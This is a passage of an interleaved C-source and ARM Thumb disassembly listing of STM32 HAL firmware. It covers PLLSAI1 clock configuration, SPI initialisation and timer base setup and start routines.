 8004bfe:	2b02      	cmp	r3, #2
 8004c00:	d902      	bls.n	8004c08 <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 8004c02:	2303      	movs	r3, #3
 8004c04:	73fb      	strb	r3, [r7, #15]
        break;
 8004c06:	e005      	b.n	8004c14 <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004c08:	4b36      	ldr	r3, [pc, #216]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c0a:	681b      	ldr	r3, [r3, #0]
 8004c0c:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004c10:	2b00      	cmp	r3, #0
 8004c12:	d1ef      	bne.n	8004bf4 <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 8004c14:	7bfb      	ldrb	r3, [r7, #15]
 8004c16:	2b00      	cmp	r3, #0
 8004c18:	d15f      	bne.n	8004cda <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004c1a:	683b      	ldr	r3, [r7, #0]
 8004c1c:	2b00      	cmp	r3, #0
 8004c1e:	d110      	bne.n	8004c42 <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004c20:	4b30      	ldr	r3, [pc, #192]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c22:	691b      	ldr	r3, [r3, #16]
 8004c24:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004c28:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004c2c:	687a      	ldr	r2, [r7, #4]
 8004c2e:	6892      	ldr	r2, [r2, #8]
 8004c30:	0211      	lsls	r1, r2, #8
 8004c32:	687a      	ldr	r2, [r7, #4]
 8004c34:	68d2      	ldr	r2, [r2, #12]
 8004c36:	06d2      	lsls	r2, r2, #27
 8004c38:	430a      	orrs	r2, r1
 8004c3a:	492a      	ldr	r1, [pc, #168]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c3c:	4313      	orrs	r3, r2
 8004c3e:	610b      	str	r3, [r1, #16]
 8004c40:	e027      	b.n	8004c92 <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004c42:	683b      	ldr	r3, [r7, #0]
 8004c44:	2b01      	cmp	r3, #1
 8004c46:	d112      	bne.n	8004c6e <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004c48:	4b26      	ldr	r3, [pc, #152]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c4a:	691b      	ldr	r3, [r3, #16]
 8004c4c:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004c50:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004c54:	687a      	ldr	r2, [r7, #4]
 8004c56:	6892      	ldr	r2, [r2, #8]
 8004c58:	0211      	lsls	r1, r2, #8
 8004c5a:	687a      	ldr	r2, [r7, #4]
 8004c5c:	6912      	ldr	r2, [r2, #16]
 8004c5e:	0852      	lsrs	r2, r2, #1
 8004c60:	3a01      	subs	r2, #1
 8004c62:	0552      	lsls	r2, r2, #21
 8004c64:	430a      	orrs	r2, r1
 8004c66:	491f      	ldr	r1, [pc, #124]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c68:	4313      	orrs	r3, r2
 8004c6a:	610b      	str	r3, [r1, #16]
 8004c6c:	e011      	b.n	8004c92 <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004c6e:	4b1d      	ldr	r3, [pc, #116]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c70:	691b      	ldr	r3, [r3, #16]
 8004c72:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004c76:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004c7a:	687a      	ldr	r2, [r7, #4]
 8004c7c:	6892      	ldr	r2, [r2, #8]
 8004c7e:	0211      	lsls	r1, r2, #8
 8004c80:	687a      	ldr	r2, [r7, #4]
 8004c82:	6952      	ldr	r2, [r2, #20]
 8004c84:	0852      	lsrs	r2, r2, #1
 8004c86:	3a01      	subs	r2, #1
 8004c88:	0652      	lsls	r2, r2, #25
 8004c8a:	430a      	orrs	r2, r1
 8004c8c:	4915      	ldr	r1, [pc, #84]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c8e:	4313      	orrs	r3, r2
 8004c90:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004c92:	4b14      	ldr	r3, [pc, #80]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c94:	681b      	ldr	r3, [r3, #0]
 8004c96:	4a13      	ldr	r2, [pc, #76]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004c98:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004c9c:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004c9e:	f7fc fb6f 	bl	8001380 <HAL_GetTick>
 8004ca2:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004ca4:	e009      	b.n	8004cba <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004ca6:	f7fc fb6b 	bl	8001380 <HAL_GetTick>
 8004caa:	4602      	mov	r2, r0
 8004cac:	68bb      	ldr	r3, [r7, #8]
 8004cae:	1ad3      	subs	r3, r2, r3
 8004cb0:	2b02      	cmp	r3, #2
 8004cb2:	d902      	bls.n	8004cba <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004cb4:	2303      	movs	r3, #3
 8004cb6:	73fb      	strb	r3, [r7, #15]
          break;
 8004cb8:	e005      	b.n	8004cc6 <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004cba:	4b0a      	ldr	r3, [pc, #40]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cbc:	681b      	ldr	r3, [r3, #0]
 8004cbe:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004cc2:	2b00      	cmp	r3, #0
 8004cc4:	d0ef      	beq.n	8004ca6 <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004cc6:	7bfb      	ldrb	r3, [r7, #15]
 8004cc8:	2b00      	cmp	r3, #0
 8004cca:	d106      	bne.n	8004cda <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004ccc:	4b05      	ldr	r3, [pc, #20]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cce:	691a      	ldr	r2, [r3, #16]
 8004cd0:	687b      	ldr	r3, [r7, #4]
 8004cd2:	699b      	ldr	r3, [r3, #24]
 8004cd4:	4903      	ldr	r1, [pc, #12]	; (8004ce4 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004cd6:	4313      	orrs	r3, r2
 8004cd8:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004cda:	7bfb      	ldrb	r3, [r7, #15]
}
 8004cdc:	4618      	mov	r0, r3
 8004cde:	3710      	adds	r7, #16
 8004ce0:	46bd      	mov	sp, r7
 8004ce2:	bd80      	pop	{r7, pc}
 8004ce4:	40021000 	.word	0x40021000

08004ce8 <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004ce8:	b580      	push	{r7, lr}
 8004cea:	b084      	sub	sp, #16
 8004cec:	af00      	add	r7, sp, #0
 8004cee:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004cf0:	687b      	ldr	r3, [r7, #4]
 8004cf2:	2b00      	cmp	r3, #0
 8004cf4:	d101      	bne.n	8004cfa <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004cf6:	2301      	movs	r3, #1
 8004cf8:	e095      	b.n	8004e26 <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004cfa:	687b      	ldr	r3, [r7, #4]
 8004cfc:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004cfe:	2b00      	cmp	r3, #0
 8004d00:	d108      	bne.n	8004d14 <HAL_SPI_Init+0x2c>
  {
    assert_param(IS_SPI_CPOL(hspi->Init.CLKPolarity));
    assert_param(IS_SPI_CPHA(hspi->Init.CLKPhase));

    if (hspi->Init.Mode == SPI_MODE_MASTER)
 8004d02:	687b      	ldr	r3, [r7, #4]
 8004d04:	685b      	ldr	r3, [r3, #4]
 8004d06:	f5b3 7f82 	cmp.w	r3, #260	; 0x104
 8004d0a:	d009      	beq.n	8004d20 <HAL_SPI_Init+0x38>
      assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
    }
    else
    {
      /* Baudrate prescaler not use in Motoraola Slave mode. force to default value */
      hspi->Init.BaudRatePrescaler = SPI_BAUDRATEPRESCALER_2;
 8004d0c:	687b      	ldr	r3, [r7, #4]
 8004d0e:	2200      	movs	r2, #0
 8004d10:	61da      	str	r2, [r3, #28]
 8004d12:	e005      	b.n	8004d20 <HAL_SPI_Init+0x38>
  else
  {
    assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));

    /* Force polarity and phase to TI protocaol requirements */
    hspi->Init.CLKPolarity = SPI_POLARITY_LOW;
 8004d14:	687b      	ldr	r3, [r7, #4]
 8004d16:	2200      	movs	r2, #0
 8004d18:	611a      	str	r2, [r3, #16]
    hspi->Init.CLKPhase    = SPI_PHASE_1EDGE;
 8004d1a:	687b      	ldr	r3, [r7, #4]
 8004d1c:	2200      	movs	r2, #0
 8004d1e:	615a      	str	r2, [r3, #20]
  {
    assert_param(IS_SPI_CRC_POLYNOMIAL(hspi->Init.CRCPolynomial));
    assert_param(IS_SPI_CRC_LENGTH(hspi->Init.CRCLength));
  }
#else
  hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004d20:	687b      	ldr	r3, [r7, #4]
 8004d22:	2200      	movs	r2, #0
 8004d24:	629a      	str	r2, [r3, #40]	; 0x28
#endif /* USE_SPI_CRC */

  if (hspi->State == HAL_SPI_STATE_RESET)
 8004d26:	687b      	ldr	r3, [r7, #4]
 8004d28:	f893 305d 	ldrb.w	r3, [r3, #93]	; 0x5d
 8004d2c:	b2db      	uxtb	r3, r3
 8004d2e:	2b00      	cmp	r3, #0
 8004d30:	d106      	bne.n	8004d40 <HAL_SPI_Init+0x58>
  {
    /* Allocate lock resource and initialize it */
    hspi->Lock = HAL_UNLOCKED;
 8004d32:	687b      	ldr	r3, [r7, #4]
 8004d34:	2200      	movs	r2, #0
 8004d36:	f883 205c 	strb.w	r2, [r3, #92]	; 0x5c

    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    hspi->MspInitCallback(hspi);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC... */
    HAL_SPI_MspInit(hspi);
 8004d3a:	6878      	ldr	r0, [r7, #4]
 8004d3c:	f7fc f8cc 	bl	8000ed8 <HAL_SPI_MspInit>
#endif /* USE_HAL_SPI_REGISTER_CALLBACKS */
  }

  hspi->State = HAL_SPI_STATE_BUSY;
 8004d40:	687b      	ldr	r3, [r7, #4]
 8004d42:	2202      	movs	r2, #2
 8004d44:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  /* Disable the selected SPI peripheral */
  __HAL_SPI_DISABLE(hspi);
 8004d48:	687b      	ldr	r3, [r7, #4]
 8004d4a:	681b      	ldr	r3, [r3, #0]
 8004d4c:	681a      	ldr	r2, [r3, #0]
 8004d4e:	687b      	ldr	r3, [r7, #4]
 8004d50:	681b      	ldr	r3, [r3, #0]
 8004d52:	f022 0240 	bic.w	r2, r2, #64	; 0x40
 8004d56:	601a      	str	r2, [r3, #0]

  /* Align by default the rs fifo threshold on the data size */
  if (hspi->Init.DataSize > SPI_DATASIZE_8BIT)
 8004d58:	687b      	ldr	r3, [r7, #4]
 8004d5a:	68db      	ldr	r3, [r3, #12]
 8004d5c:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004d60:	d902      	bls.n	8004d68 <HAL_SPI_Init+0x80>
  {
    frxth = SPI_RXFIFO_THRESHOLD_HF;
 8004d62:	2300      	movs	r3, #0
 8004d64:	60fb      	str	r3, [r7, #12]
 8004d66:	e002      	b.n	8004d6e <HAL_SPI_Init+0x86>
  }
  else
  {
    frxth = SPI_RXFIFO_THRESHOLD_QF;
 8004d68:	f44f 5380 	mov.w	r3, #4096	; 0x1000
 8004d6c:	60fb      	str	r3, [r7, #12]
  }

  /* CRC calculation is valid only for 16Bit and 8 Bit */
  if ((hspi->Init.DataSize != SPI_DATASIZE_16BIT) && (hspi->Init.DataSize != SPI_DATASIZE_8BIT))
 8004d6e:	687b      	ldr	r3, [r7, #4]
 8004d70:	68db      	ldr	r3, [r3, #12]
 8004d72:	f5b3 6f70 	cmp.w	r3, #3840	; 0xf00
 8004d76:	d007      	beq.n	8004d88 <HAL_SPI_Init+0xa0>
 8004d78:	687b      	ldr	r3, [r7, #4]
 8004d7a:	68db      	ldr	r3, [r3, #12]
 8004d7c:	f5b3 6fe0 	cmp.w	r3, #1792	; 0x700
 8004d80:	d002      	beq.n	8004d88 <HAL_SPI_Init+0xa0>
  {
    /* CRC must be disabled */
    hspi->Init.CRCCalculation = SPI_CRCCALCULATION_DISABLE;
 8004d82:	687b      	ldr	r3, [r7, #4]
 8004d84:	2200      	movs	r2, #0
 8004d86:	629a      	str	r2, [r3, #40]	; 0x28
  }

  /*----------------------- SPIx CR1 & CR2 Configuration ---------------------*/
  /* Configure : SPI Mode, Communication Mode, Clock polarity and phase, NSS management,
  Communication speed, First bit and CRC calculation state */
  WRITE_REG(hspi->Instance->CR1, ((hspi->Init.Mode & (SPI_CR1_MSTR | SPI_CR1_SSI)) |
 8004d88:	687b      	ldr	r3, [r7, #4]
 8004d8a:	685b      	ldr	r3, [r3, #4]
 8004d8c:	f403 7282 	and.w	r2, r3, #260	; 0x104
 8004d90:	687b      	ldr	r3, [r7, #4]
 8004d92:	689b      	ldr	r3, [r3, #8]
 8004d94:	f403 4304 	and.w	r3, r3, #33792	; 0x8400
 8004d98:	431a      	orrs	r2, r3
 8004d9a:	687b      	ldr	r3, [r7, #4]
 8004d9c:	691b      	ldr	r3, [r3, #16]
 8004d9e:	f003 0302 	and.w	r3, r3, #2
 8004da2:	431a      	orrs	r2, r3
 8004da4:	687b      	ldr	r3, [r7, #4]
 8004da6:	695b      	ldr	r3, [r3, #20]
 8004da8:	f003 0301 	and.w	r3, r3, #1
 8004dac:	431a      	orrs	r2, r3
 8004dae:	687b      	ldr	r3, [r7, #4]
 8004db0:	699b      	ldr	r3, [r3, #24]
 8004db2:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8004db6:	431a      	orrs	r2, r3
 8004db8:	687b      	ldr	r3, [r7, #4]
 8004dba:	69db      	ldr	r3, [r3, #28]
 8004dbc:	f003 0338 	and.w	r3, r3, #56	; 0x38
 8004dc0:	431a      	orrs	r2, r3
 8004dc2:	687b      	ldr	r3, [r7, #4]
 8004dc4:	6a1b      	ldr	r3, [r3, #32]
 8004dc6:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8004dca:	ea42 0103 	orr.w	r1, r2, r3
 8004dce:	687b      	ldr	r3, [r7, #4]
 8004dd0:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004dd2:	f403 5200 	and.w	r2, r3, #8192	; 0x2000
 8004dd6:	687b      	ldr	r3, [r7, #4]
 8004dd8:	681b      	ldr	r3, [r3, #0]
 8004dda:	430a      	orrs	r2, r1
 8004ddc:	601a      	str	r2, [r3, #0]
    }
  }
#endif /* USE_SPI_CRC */

  /* Configure : NSS management, TI Mode, NSS Pulse, Data size and Rx Fifo threshold */
  WRITE_REG(hspi->Instance->CR2, (((hspi->Init.NSS >> 16U) & SPI_CR2_SSOE) |
 8004dde:	687b      	ldr	r3, [r7, #4]
 8004de0:	699b      	ldr	r3, [r3, #24]
 8004de2:	0c1b      	lsrs	r3, r3, #16
 8004de4:	f003 0204 	and.w	r2, r3, #4
 8004de8:	687b      	ldr	r3, [r7, #4]
 8004dea:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004dec:	f003 0310 	and.w	r3, r3, #16
 8004df0:	431a      	orrs	r2, r3
 8004df2:	687b      	ldr	r3, [r7, #4]
 8004df4:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004df6:	f003 0308 	and.w	r3, r3, #8
 8004dfa:	431a      	orrs	r2, r3
 8004dfc:	687b      	ldr	r3, [r7, #4]
 8004dfe:	68db      	ldr	r3, [r3, #12]
 8004e00:	f403 6370 	and.w	r3, r3, #3840	; 0xf00
 8004e04:	ea42 0103 	orr.w	r1, r2, r3
 8004e08:	68fb      	ldr	r3, [r7, #12]
 8004e0a:	f403 5280 	and.w	r2, r3, #4096	; 0x1000
 8004e0e:	687b      	ldr	r3, [r7, #4]
 8004e10:	681b      	ldr	r3, [r3, #0]
 8004e12:	430a      	orrs	r2, r1
 8004e14:	605a      	str	r2, [r3, #4]
#if defined(SPI_I2SCFGR_I2SMOD)
  /* Activate the SPI mode (Make sure that I2SMOD bit in I2SCFGR register is reset) */
  CLEAR_BIT(hspi->Instance->I2SCFGR, SPI_I2SCFGR_I2SMOD);
#endif /* SPI_I2SCFGR_I2SMOD */

  hspi->ErrorCode = HAL_SPI_ERROR_NONE;
 8004e16:	687b      	ldr	r3, [r7, #4]
 8004e18:	2200      	movs	r2, #0
 8004e1a:	661a      	str	r2, [r3, #96]	; 0x60
  hspi->State     = HAL_SPI_STATE_READY;
 8004e1c:	687b      	ldr	r3, [r7, #4]
 8004e1e:	2201      	movs	r2, #1
 8004e20:	f883 205d 	strb.w	r2, [r3, #93]	; 0x5d

  return HAL_OK;
 8004e24:	2300      	movs	r3, #0
}
 8004e26:	4618      	mov	r0, r3
 8004e28:	3710      	adds	r7, #16
 8004e2a:	46bd      	mov	sp, r7
 8004e2c:	bd80      	pop	{r7, pc}

08004e2e <HAL_TIM_Base_Init>:
  *         Ex: call @ref HAL_TIM_Base_DeInit() before HAL_TIM_Base_Init()
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Init(TIM_HandleTypeDef *htim)
{
 8004e2e:	b580      	push	{r7, lr}
 8004e30:	b082      	sub	sp, #8
 8004e32:	af00      	add	r7, sp, #0
 8004e34:	6078      	str	r0, [r7, #4]
  /* Check the TIM handle allocation */
  if (htim == NULL)
 8004e36:	687b      	ldr	r3, [r7, #4]
 8004e38:	2b00      	cmp	r3, #0
 8004e3a:	d101      	bne.n	8004e40 <HAL_TIM_Base_Init+0x12>
  {
    return HAL_ERROR;
 8004e3c:	2301      	movs	r3, #1
 8004e3e:	e049      	b.n	8004ed4 <HAL_TIM_Base_Init+0xa6>
  assert_param(IS_TIM_COUNTER_MODE(htim->Init.CounterMode));
  assert_param(IS_TIM_CLOCKDIVISION_DIV(htim->Init.ClockDivision));
  assert_param(IS_TIM_PERIOD(htim, htim->Init.Period));
  assert_param(IS_TIM_AUTORELOAD_PRELOAD(htim->Init.AutoReloadPreload));

  if (htim->State == HAL_TIM_STATE_RESET)
 8004e40:	687b      	ldr	r3, [r7, #4]
 8004e42:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004e46:	b2db      	uxtb	r3, r3
 8004e48:	2b00      	cmp	r3, #0
 8004e4a:	d106      	bne.n	8004e5a <HAL_TIM_Base_Init+0x2c>
  {
    /* Allocate lock resource and initialize it */
    htim->Lock = HAL_UNLOCKED;
 8004e4c:	687b      	ldr	r3, [r7, #4]
 8004e4e:	2200      	movs	r2, #0
 8004e50:	f883 203c 	strb.w	r2, [r3, #60]	; 0x3c
    }
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    htim->Base_MspInitCallback(htim);
#else
    /* Init the low level hardware : GPIO, CLOCK, NVIC */
    HAL_TIM_Base_MspInit(htim);
 8004e54:	6878      	ldr	r0, [r7, #4]
 8004e56:	f7fc f943 	bl	80010e0 <HAL_TIM_Base_MspInit>
#endif /* USE_HAL_TIM_REGISTER_CALLBACKS */
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004e5a:	687b      	ldr	r3, [r7, #4]
 8004e5c:	2202      	movs	r2, #2
 8004e5e:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Set the Time Base configuration */
  TIM_Base_SetConfig(htim->Instance, &htim->Init);
 8004e62:	687b      	ldr	r3, [r7, #4]
 8004e64:	681a      	ldr	r2, [r3, #0]
 8004e66:	687b      	ldr	r3, [r7, #4]
 8004e68:	3304      	adds	r3, #4
 8004e6a:	4619      	mov	r1, r3
 8004e6c:	4610      	mov	r0, r2
 8004e6e:	f000 fa7d 	bl	800536c <TIM_Base_SetConfig>

  /* Initialize the DMA burst operation state */
  htim->DMABurstState = HAL_DMA_BURST_STATE_READY;
 8004e72:	687b      	ldr	r3, [r7, #4]
 8004e74:	2201      	movs	r2, #1
 8004e76:	f883 2048 	strb.w	r2, [r3, #72]	; 0x48

  /* Initialize the TIM channels state */
  TIM_CHANNEL_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004e7a:	687b      	ldr	r3, [r7, #4]
 8004e7c:	2201      	movs	r2, #1
 8004e7e:	f883 203e 	strb.w	r2, [r3, #62]	; 0x3e
 8004e82:	687b      	ldr	r3, [r7, #4]
 8004e84:	2201      	movs	r2, #1
 8004e86:	f883 203f 	strb.w	r2, [r3, #63]	; 0x3f
 8004e8a:	687b      	ldr	r3, [r7, #4]
 8004e8c:	2201      	movs	r2, #1
 8004e8e:	f883 2040 	strb.w	r2, [r3, #64]	; 0x40
 8004e92:	687b      	ldr	r3, [r7, #4]
 8004e94:	2201      	movs	r2, #1
 8004e96:	f883 2041 	strb.w	r2, [r3, #65]	; 0x41
 8004e9a:	687b      	ldr	r3, [r7, #4]
 8004e9c:	2201      	movs	r2, #1
 8004e9e:	f883 2042 	strb.w	r2, [r3, #66]	; 0x42
 8004ea2:	687b      	ldr	r3, [r7, #4]
 8004ea4:	2201      	movs	r2, #1
 8004ea6:	f883 2043 	strb.w	r2, [r3, #67]	; 0x43
  TIM_CHANNEL_N_STATE_SET_ALL(htim, HAL_TIM_CHANNEL_STATE_READY);
 8004eaa:	687b      	ldr	r3, [r7, #4]
 8004eac:	2201      	movs	r2, #1
 8004eae:	f883 2044 	strb.w	r2, [r3, #68]	; 0x44
 8004eb2:	687b      	ldr	r3, [r7, #4]
 8004eb4:	2201      	movs	r2, #1
 8004eb6:	f883 2045 	strb.w	r2, [r3, #69]	; 0x45
 8004eba:	687b      	ldr	r3, [r7, #4]
 8004ebc:	2201      	movs	r2, #1
 8004ebe:	f883 2046 	strb.w	r2, [r3, #70]	; 0x46
 8004ec2:	687b      	ldr	r3, [r7, #4]
 8004ec4:	2201      	movs	r2, #1
 8004ec6:	f883 2047 	strb.w	r2, [r3, #71]	; 0x47

  /* Initialize the TIM state*/
  htim->State = HAL_TIM_STATE_READY;
 8004eca:	687b      	ldr	r3, [r7, #4]
 8004ecc:	2201      	movs	r2, #1
 8004ece:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  return HAL_OK;
 8004ed2:	2300      	movs	r3, #0
}
 8004ed4:	4618      	mov	r0, r3
 8004ed6:	3708      	adds	r7, #8
 8004ed8:	46bd      	mov	sp, r7
 8004eda:	bd80      	pop	{r7, pc}

08004edc <HAL_TIM_Base_Start_IT>:
  * @brief  Starts the TIM Base generation in interrupt mode.
  * @param  htim TIM Base handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_TIM_Base_Start_IT(TIM_HandleTypeDef *htim)
{
 8004edc:	b480      	push	{r7}
 8004ede:	b085      	sub	sp, #20
 8004ee0:	af00      	add	r7, sp, #0
 8004ee2:	6078      	str	r0, [r7, #4]

  /* Check the parameters */
  assert_param(IS_TIM_INSTANCE(htim->Instance));

  /* Check the TIM state */
  if (htim->State != HAL_TIM_STATE_READY)
 8004ee4:	687b      	ldr	r3, [r7, #4]
 8004ee6:	f893 303d 	ldrb.w	r3, [r3, #61]	; 0x3d
 8004eea:	b2db      	uxtb	r3, r3
 8004eec:	2b01      	cmp	r3, #1
 8004eee:	d001      	beq.n	8004ef4 <HAL_TIM_Base_Start_IT+0x18>
  {
    return HAL_ERROR;
 8004ef0:	2301      	movs	r3, #1
 8004ef2:	e03b      	b.n	8004f6c <HAL_TIM_Base_Start_IT+0x90>
  }

  /* Set the TIM state */
  htim->State = HAL_TIM_STATE_BUSY;
 8004ef4:	687b      	ldr	r3, [r7, #4]
 8004ef6:	2202      	movs	r2, #2
 8004ef8:	f883 203d 	strb.w	r2, [r3, #61]	; 0x3d

  /* Enable the TIM Update interrupt */
  __HAL_TIM_ENABLE_IT(htim, TIM_IT_UPDATE);
 8004efc:	687b      	ldr	r3, [r7, #4]
 8004efe:	681b      	ldr	r3, [r3, #0]
 8004f00:	68da      	ldr	r2, [r3, #12]
 8004f02:	687b      	ldr	r3, [r7, #4]
 8004f04:	681b      	ldr	r3, [r3, #0]
 8004f06:	f042 0201 	orr.w	r2, r2, #1
 8004f0a:	60da      	str	r2, [r3, #12]

  /* Enable the Peripheral, except in trigger mode where enable is automatically done with trigger */
  if (IS_TIM_SLAVE_INSTANCE(htim->Instance))
 8004f0c:	687b      	ldr	r3, [r7, #4]
 8004f0e:	681b      	ldr	r3, [r3, #0]
 8004f10:	4a19      	ldr	r2, [pc, #100]	; (8004f78 <HAL_TIM_Base_Start_IT+0x9c>)
 8004f12:	4293      	cmp	r3, r2
 8004f14:	d009      	beq.n	8004f2a <HAL_TIM_Base_Start_IT+0x4e>
 8004f16:	687b      	ldr	r3, [r7, #4]
 8004f18:	681b      	ldr	r3, [r3, #0]
 8004f1a:	f1b3 4f80 	cmp.w	r3, #1073741824	; 0x40000000
 8004f1e:	d004      	beq.n	8004f2a <HAL_TIM_Base_Start_IT+0x4e>
 8004f20:	687b      	ldr	r3, [r7, #4]
 8004f22:	681b      	ldr	r3, [r3, #0]
 8004f24:	4a15      	ldr	r2, [pc, #84]	; (8004f7c <HAL_TIM_Base_Start_IT+0xa0>)
 8004f26:	4293      	cmp	r3, r2
 8004f28:	d115      	bne.n	8004f56 <HAL_TIM_Base_Start_IT+0x7a>
  {
    tmpsmcr = htim->Instance->SMCR & TIM_SMCR_SMS;
 8004f2a:	687b      	ldr	r3, [r7, #4]
 8004f2c:	681b      	ldr	r3, [r3, #0]
 8004f2e:	689a      	ldr	r2, [r3, #8]
 8004f30:	4b13      	ldr	r3, [pc, #76]	; (8004f80 <HAL_TIM_Base_Start_IT+0xa4>)
 8004f32:	4013      	ands	r3, r2
 8004f34:	60fb      	str	r3, [r7, #12]
    if (!IS_TIM_SLAVEMODE_TRIGGER_ENABLED(tmpsmcr))
 8004f36:	68fb      	ldr	r3, [r7, #12]
 8004f38:	2b06      	cmp	r3, #6
